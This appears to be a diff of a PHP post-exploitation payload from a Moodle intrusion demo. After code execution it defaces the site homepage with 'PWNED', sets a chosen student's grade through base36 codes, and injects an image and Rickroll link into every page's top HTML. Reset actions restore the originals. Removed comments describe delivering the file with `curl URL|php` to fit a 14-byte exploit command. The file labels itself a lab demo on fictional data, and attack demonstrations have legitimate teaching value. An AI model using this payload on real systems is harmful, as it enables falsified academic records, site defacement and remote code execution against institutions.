@@ -1,17 +1,14 @@
 <?php
 // Single instructor payload for the PHP2Shell Moodle demo.
 //
-// The action is read from /loot/action (or argv[1]) so the controller can
-// deliver this file over a short URL and execute it with `curl URL|php`
-// without passing a long argument through the 14-byte PoC.
+// The instructor controller passes a compact code in argv[1], keeping
+// `php /tmp/p <code>` within the 14-byte PoC command limit.
 //
 // Actions:
-//   homepage
-//   reset-homepage
-//   grade 30
-//   grade 100
-//   rickroll
-//   reset-rickroll
+//   0: clear the previous HTTP proof
+//   1: homepage; 2: reset-homepage
+//   g<base36>: set an integer grade (for example g2s is 100)
+//   5: good-hacker; 6: reset-good-hacker
 //
 // This file is a demo payload, not a web endpoint. It reads the local Moodle
 // config and only touches the fictional course, grade, and front-page values.
@@ -25,21 +22,11 @@ require_once($CFG->libdir . '/gradelib.php');
 require_once($CFG->libdir . '/grade/grade_item.php');
 require_once($CFG->libdir . '/grade/grade_grade.php');
 
-$action = $argv[1] ?? '';
-if ($action === '' && is_readable('/loot/action')) {
-    $action = trim((string) file_get_contents('/loot/action'));
-}
-$action = preg_replace('/\s+/', ' ', $action);
+$action = (string) ($argv[1] ?? '');
 $imageUrl = 'https://s.xn--kst.tw/good-hacker.webp';
-if (is_readable('/loot/image-url')) {
-    $candidate = trim((string) file_get_contents('/loot/image-url'));
-    if (preg_match('#^https://#', $candidate)) {
-        $imageUrl = $candidate;
-    }
-}
 $imageUrlSafe = htmlspecialchars($imageUrl, ENT_QUOTES, 'UTF-8');
 $proof = function (string $text): void {
-    file_put_contents('/loot/demo-proof.txt', $text . "\n");
+    file_put_contents('/var/www/html/demo-proof.txt', $text . "\n");
     echo $text . "\n";
 };
 $fail = function (string $reason) use ($proof): void {
@@ -49,7 +36,11 @@ $fail = function (string $reason) use ($proof): void {
 
 try {
     switch ($action) {
-        case 'homepage':
+        case '0':
+            @unlink('/var/www/html/demo-proof.txt');
+            break;
+
+        case '1':
             $site = $DB->get_record('course', ['id' => 1], '*', MUST_EXIST);
             if (!get_config('core', 'lab_demo_homepage_saved')) {
                 set_config('lab_demo_homepage_fullname', $site->fullname);
@@ -67,7 +58,7 @@ try {
             $proof('homepage=ok fullname=PWNED by PHP2Shell shortname=PWNED db=verified');
             break;
 
-        case 'reset-homepage':
+        case '2':
             $fullname = get_config('core', 'lab_demo_homepage_fullname');
             $shortname = get_config('core', 'lab_demo_homepage_shortname');
             $fullname = $fullname ?: 'NCKU Moodle';
@@ -87,9 +78,11 @@ try {
             $proof("homepage-reset=ok fullname={$fullname} shortname={$shortname} db=verified");
             break;
 
-        case 'grade 30':
-        case 'grade 100':
-            $value = $action === 'grade 30' ? 30.0 : 100.0;
+        default:
+            if (!preg_match('/^g([0-9a-z]{1,2})$/', $action, $match)) {
+                $fail('unknown action code');
+            }
+            $value = (float) base_convert($match[1], 36, 10);
             $course = $DB->get_record('course', ['shortname' => 'OS'], '*', MUST_EXIST);
             $user = $DB->get_record('user', ['username' => 'p2s_student', 'deleted' => 0], '*', MUST_EXIST);
             $item = $DB->get_record('grade_items', [
@@ -122,11 +115,11 @@ try {
             ));
             break;
 
-        case 'rickroll':
-            if (!get_config('core', 'lab_demo_rickroll_top_saved')) {
+        case '5':
+            if (!get_config('core', 'lab_demo_good_hacker_top_saved')) {
                 $previous = get_config('core', 'additionalhtmltopofbody');
-                set_config('lab_demo_rickroll_top_previous', is_string($previous) ? $previous : '');
-                set_config('lab_demo_rickroll_top_saved', 1);
+                set_config('lab_demo_good_hacker_top_previous', is_string($previous) ? $previous : '');
+                set_config('lab_demo_good_hacker_top_saved', 1);
             }
             $top = get_config('core', 'additionalhtmltopofbody');
             $top = is_string($top) ? $top : '';
@@ -144,35 +137,32 @@ try {
                 || strpos($check, 'youtube.com/watch?v=dQw4w9WgXcQ') === false) {
                 $fail('front-page image or link readback mismatch');
             }
-            $proof('rickroll=ok image=' . $imageUrl . ' link=youtube db=verified');
+            $proof('good-hacker=ok image=' . $imageUrl . ' link=youtube db=verified');
             break;
 
-        case 'reset-rickroll':
-            if (!get_config('core', 'lab_demo_rickroll_top_saved')) {
+        case '6':
+            if (!get_config('core', 'lab_demo_good_hacker_top_saved')) {
                 $current = get_config('core', 'additionalhtmltopofbody');
                 $fileleft = file_exists('/var/www/html/good-hacker.webp');
                 $linkleft = is_string($current) && strpos($current, 'good-hacker.webp') !== false;
                 if (!$fileleft && !$linkleft) {
-                    $proof('rickroll-reset=ok image=absent link=absent top=already-baseline db=verified');
+                    $proof('good-hacker-reset=ok image=absent link=absent top=already-baseline db=verified');
                     break;
                 }
                 $fail('no saved top-of-page HTML, but the image/link is still present');
             }
-            $previous = get_config('core', 'lab_demo_rickroll_top_previous');
+            $previous = get_config('core', 'lab_demo_good_hacker_top_previous');
             set_config('additionalhtmltopofbody', is_string($previous) ? $previous : '');
-            unset_config('lab_demo_rickroll_top_previous');
-            unset_config('lab_demo_rickroll_top_saved');
+            unset_config('lab_demo_good_hacker_top_previous');
+            unset_config('lab_demo_good_hacker_top_saved');
             @unlink('/var/www/html/good-hacker.webp');
             purge_caches();
             $check = get_config('core', 'additionalhtmltopofbody');
             if (is_string($check) && strpos($check, 'good-hacker.webp') !== false) {
                 $fail('front-page image link still present');
             }
-            $proof('rickroll-reset=ok image=absent link=absent top=restored db=verified');
+            $proof('good-hacker-reset=ok image=absent link=absent top=restored db=verified');
             break;
-
-        default:
-            $fail('unknown action; use homepage, reset-homepage, grade 30, grade 100, rickroll, or reset-rickroll');
     }
 } catch (Throwable $e) {
     $fail($e->getMessage());
